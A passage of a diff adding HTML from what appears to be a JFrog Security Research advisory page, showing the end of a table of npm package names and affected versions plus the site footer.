+<td align="left">license-o-matic</td>
+<td align="left">[1.2.1],[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">lint-staged-imagemin</td>
+<td align="left">[1.3.1],[1.3.2]</td>
+</tr>
+<tr>
+<td align="left">lite-serper-mcp-server</td>
+<td align="left">[0.2.2]</td>
+</tr>
+<tr>
+<td align="left">luno-api</td>
+<td align="left">[1.2.3]</td>
+</tr>
+<tr>
+<td align="left">manual-billing-system-miniapp-api</td>
+<td align="left">[1.3.1]</td>
+</tr>
+<tr>
+<td align="left">mcp-use</td>
+<td align="left">[1.4.2],[1.4.3]</td>
+</tr>
+<tr>
+<td align="left">medusa-plugin-announcement</td>
+<td align="left">[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">medusa-plugin-logs</td>
+<td align="left">[0.0.17]</td>
+</tr>
+<tr>
+<td align="left">medusa-plugin-momo</td>
+<td align="left">[0.0.68]</td>
+</tr>
+<tr>
+<td align="left">medusa-plugin-product-reviews-kvy</td>
+<td align="left">[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">medusa-plugin-zalopay</td>
+<td align="left">[0.0.40]</td>
+</tr>
+<tr>
+<td align="left">mod10-check-digit</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">mon-package-react-typescript</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">n8n-nodes-tmdb</td>
+<td align="left">[0.5.1]</td>
+</tr>
+<tr>
+<td align="left">n8n-nodes-vercel-ai-sdk</td>
+<td align="left">[0.1.7]</td>
+</tr>
+<tr>
+<td align="left">n8n-nodes-viral-app</td>
+<td align="left">[0.2.5]</td>
+</tr>
+<tr>
+<td align="left">nanoreset</td>
+<td align="left">[7.0.1],[7.0.2]</td>
+</tr>
+<tr>
+<td align="left">next-circular-dependency</td>
+<td align="left">[1.0.2],[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">next-simple-google-analytics</td>
+<td align="left">[1.1.1],[1.1.2]</td>
+</tr>
+<tr>
+<td align="left">next-styled-nprogress</td>
+<td align="left">[1.0.4],[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">ngx-useful-swiper-prosenjit</td>
+<td align="left">[9.0.2]</td>
+</tr>
+<tr>
+<td align="left">ngx-wooapi</td>
+<td align="left">[12.0.1]</td>
+</tr>
+<tr>
+<td align="left">normal-store</td>
+<td align="left">[1.3.1],[1.3.2],[1.3.3],[1.3.4]</td>
+</tr>
+<tr>
+<td align="left">obj-to-css</td>
+<td align="left">[1.0.2],[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">okta-react-router-6</td>
+<td align="left">[5.0.1]</td>
+</tr>
+<tr>
+<td align="left">open2internet</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">orbit-boxicons</td>
+<td align="left">[2.1.3]</td>
+</tr>
+<tr>
+<td align="left">orbit-nebula-draw-tools</td>
+<td align="left">[1.0.10]</td>
+</tr>
+<tr>
+<td align="left">orbit-nebula-editor</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">orbit-soap</td>
+<td align="left">[0.43.13]</td>
+</tr>
+<tr>
+<td align="left">orchestrix</td>
+<td align="left">[12.1.2]</td>
+</tr>
+<tr>
+<td align="left">package-tester</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">parcel-plugin-asset-copier</td>
+<td align="left">[1.1.2],[1.1.3]</td>
+</tr>
+<tr>
+<td align="left">pdf-annotation</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">piclite</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">pico-uid</td>
+<td align="left">[1.0.3],[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">pkg-readme</td>
+<td align="left">[1.1.1]</td>
+</tr>
+<tr>
+<td align="left">poper-react-sdk</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">posthog-docusaurus</td>
+<td align="left">[2.0.6]</td>
+</tr>
+<tr>
+<td align="left">posthog-js</td>
+<td align="left">[1.297.3]</td>
+</tr>
+<tr>
+<td align="left">posthog-node</td>
+<td align="left">[4.18.1],[5.11.3],[5.13.3]</td>
+</tr>
+<tr>
+<td align="left">posthog-plugin-hello-world</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">posthog-react-native-session-replay</td>
+<td align="left">[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">posthog-react-native</td>
+<td align="left">[4.11.1],[4.12.5]</td>
+</tr>
+<tr>
+<td align="left">prime-one-table</td>
+<td align="left">[0.0.19]</td>
+</tr>
+<tr>
+<td align="left">prompt-eng-server</td>
+<td align="left">[1.0.18]</td>
+</tr>
+<tr>
+<td align="left">prompt-eng</td>
+<td align="left">[1.0.50]</td>
+</tr>
+<tr>
+<td align="left">puny-req</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">ra-auth-firebase</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">ra-data-firebase</td>
+<td align="left">[1.0.7],[1.0.8]</td>
+</tr>
+<tr>
+<td align="left">react-component-taggers</td>
+<td align="left">[0.1.9]</td>
+</tr>
+<tr>
+<td align="left">react-element-prompt-inspector</td>
+<td align="left">[0.1.18]</td>
+</tr>
+<tr>
+<td align="left">react-favic</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-hook-form-persist</td>
+<td align="left">[3.0.1],[3.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-jam-icons</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-keycloak-context</td>
+<td align="left">[1.0.8],[1.0.9]</td>
+</tr>
+<tr>
+<td align="left">react-library-setup</td>
+<td align="left">[0.0.6]</td>
+</tr>
+<tr>
+<td align="left">react-linear-loader</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-micromodal.js</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-datepicker-modal</td>
+<td align="left">[1.3.1],[1.3.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-email</td>
+<td align="left">[2.1.1],[2.1.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-fetch</td>
+<td align="left">[2.0.1],[2.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-get-pixel-dimensions</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-google-maps-directions</td>
+<td align="left">[2.1.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-jam-icons</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-log-level</td>
+<td align="left">[1.2.1],[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-modest-checkbox</td>
+<td align="left">[3.3.1]</td>
+</tr>
+<tr>
+<td align="left">react-native-modest-storage</td>
+<td align="left">[2.1.1]</td>
+</tr>
+<tr>
+<td align="left">react-native-phone-call</td>
+<td align="left">[1.2.1],[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-retriable-fetch</td>
+<td align="left">[2.0.1],[2.0.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-use-modal</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">react-native-view-finder</td>
+<td align="left">[1.2.1],[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">react-native-websocket</td>
+<td align="left">[1.0.3],[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">react-native-worklet-functions</td>
+<td align="left">[3.3.3]</td>
+</tr>
+<tr>
+<td align="left">react-qr-image</td>
+<td align="left">[1.1.1]</td>
+</tr>
+<tr>
+<td align="left">rediff-viewer</td>
+<td align="left">[0.0.7]</td>
+</tr>
+<tr>
+<td align="left">rediff</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">redux-forge</td>
+<td align="left">[2.5.3]</td>
+</tr>
+<tr>
+<td align="left">redux-router-kit</td>
+<td align="left">[1.2.2],[1.2.3],[1.2.4]</td>
+</tr>
+<tr>
+<td align="left">rollup-plugin-httpfile</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">sa-company-registration-number-regex</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">sa-id-gen</td>
+<td align="left">[1.0.4],[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">samesame</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">scgs-capacitor-subscribe</td>
+<td align="left">[1.0.11]</td>
+</tr>
+<tr>
+<td align="left">scgsffcreator</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">selenium-session-client</td>
+<td align="left">[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">selenium-session</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">set-nested-prop</td>
+<td align="left">[2.0.1],[2.0.2]</td>
+</tr>
+<tr>
+<td align="left">shelf-jwt-sessions</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">shell-exec</td>
+<td align="left">[1.1.3],[1.1.4]</td>
+</tr>
+<tr>
+<td align="left">shinhan-limit-scrap</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">skills-use</td>
+<td align="left">[0.1.1],[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">solomon-api-stories</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">solomon-v3-stories</td>
+<td align="left">[1.15.6]</td>
+</tr>
+<tr>
+<td align="left">solomon-v3-ui-wrapper</td>
+<td align="left">[1.6.1]</td>
+</tr>
+<tr>
+<td align="left">sort-by-distance</td>
+<td align="left">[2.0.1]</td>
+</tr>
+<tr>
+<td align="left">south-african-id-info</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">stat-fns</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">stoor</td>
+<td align="left">[2.3.2]</td>
+</tr>
+<tr>
+<td align="left">super-commit</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">svelte-autocomplete-select</td>
+<td align="left">[1.1.1]</td>
+</tr>
+<tr>
+<td align="left">svelte-toasty</td>
+<td align="left">[1.1.2],[1.1.3]</td>
+</tr>
+<tr>
+<td align="left">tanstack-shadcn-table</td>
+<td align="left">[1.1.5]</td>
+</tr>
+<tr>
+<td align="left">tcsp-draw-test</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">tcsp-test-vd</td>
+<td align="left">[2.4.4]</td>
+</tr>
+<tr>
+<td align="left">tcsp</td>
+<td align="left">[2.0.2]</td>
+</tr>
+<tr>
+<td align="left">template-lib</td>
+<td align="left">[1.1.3],[1.1.4]</td>
+</tr>
+<tr>
+<td align="left">template-micro-service</td>
+<td align="left">[1.0.2],[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">tenacious-fetch</td>
+<td align="left">[2.3.2],[2.3.3]</td>
+</tr>
+<tr>
+<td align="left">test-foundry-app</td>
+<td align="left">[1.0.1],[1.0.2],[1.0.3],[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">test-hardhat-app</td>
+<td align="left">[1.0.1],[1.0.2],[1.0.3],[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">test23112222-api</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">tiaan</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">token.js-fork</td>
+<td align="left">[0.7.32]</td>
+</tr>
+<tr>
+<td align="left">trigo-react-app</td>
+<td align="left">[4.1.2]</td>
+</tr>
+<tr>
+<td align="left">typefence</td>
+<td align="left">[1.2.2],[1.2.3]</td>
+</tr>
+<tr>
+<td align="left">typeorm-orbit</td>
+<td align="left">[0.2.27]</td>
+</tr>
+<tr>
+<td align="left">undefsafe-typed</td>
+<td align="left">[1.0.3],[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">uplandui</td>
+<td align="left">[0.5.4]</td>
+</tr>
+<tr>
+<td align="left">upload-to-play-store</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">url-encode-decode</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">use-unsaved-changes</td>
+<td align="left">[1.0.9]</td>
+</tr>
+<tr>
+<td align="left">valid-south-african-id</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">vf-oss-template</td>
+<td align="left">[1.0.1],[1.0.2],[1.0.3],[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">vite-plugin-httpfile</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">web-scraper-mcp</td>
+<td align="left">[1.1.4]</td>
+</tr>
+<tr>
+<td align="left">web-types-htmx</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">web-types-lit</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">webpack-loader-httpfile</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">wellness-expert-ng-gallery</td>
+<td align="left">[5.1.1]</td>
+</tr>
+<tr>
+<td align="left">wenk</td>
+<td align="left">[1.0.10],[1.0.9]</td>
+</tr>
+<tr>
+<td align="left">zapier-async-storage</td>
+<td align="left">[1.0.1],[1.0.2],[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">zapier-platform-cli</td>
+<td align="left">[18.0.2],[18.0.3],[18.0.4]</td>
+</tr>
+<tr>
+<td align="left">zapier-platform-core</td>
+<td align="left">[18.0.2],[18.0.3],[18.0.4]</td>
+</tr>
+<tr>
+<td align="left">zapier-platform-legacy-scripting-runner</td>
+<td align="left">[4.0.2],[4.0.3],[4.0.4]</td>
+</tr>
+<tr>
+<td align="left">zapier-platform-schema</td>
+<td align="left">[18.0.2],[18.0.3],[18.0.4]</td>
+</tr>
+<tr>
+<td align="left">zapier-scripts</td>
+<td align="left">[7.8.3],[7.8.4]</td>
+</tr>
+<tr>
+<td align="left">zuper-cli</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">zuper-sdk</td>
+<td align="left">[1.0.57]</td>
+</tr>
+<tr>
+<td align="left">zuper-stream</td>
+<td align="left">[2.0.9]</td>
+</tr>
+</tbody>
+</table>
+</section><!----></div></div></div><footer class="py-4 main-footer bg-black"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2025 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script src="/assets/js/app.0e2b95e3.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.3b205ae6.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
